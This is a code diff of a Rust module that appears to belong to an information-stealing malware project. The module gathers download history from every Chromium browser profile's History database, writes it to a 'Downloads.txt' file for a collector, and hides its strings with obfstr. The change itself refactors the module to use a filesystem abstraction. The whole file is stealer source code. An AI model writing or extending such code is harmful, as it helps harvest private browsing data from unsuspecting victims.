@@ -1,12 +1,14 @@
 use crate::chromium::BrowserData;
-use crate::{Download, collect_and_read_sqlite_from_all_profiles, to_string_and_write_all};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Download};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{Task, parent_name};
-use utils::path::Path;
+use tasks::{parent_name, Task};
 
 const DOWNLOADS_CURRENT_PATH: usize = 2;
 const DOWNLOADS_TAB_URL: usize = 16;
@@ -21,12 +23,13 @@ impl DownloadsTask {
     }
 }
 
-impl<C: Collector> Task<C> for DownloadsTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for DownloadsTask {
     parent_name!("Downloads.txt");
 
-    fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(mut downloads) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("History"),
             s!("Downloads"),
             extract_download_from_record,
@@ -38,7 +41,7 @@ impl<C: Collector> Task<C> for DownloadsTask {
         collector
             .get_browser()
             .increase_downloads_by(downloads.len());
-        let _ = to_string_and_write_all(&downloads, "\n\n", parent);
+        let _ = to_string_and_write_all(&downloads, "\n\n", filesystem, parent);
     }
 }
 
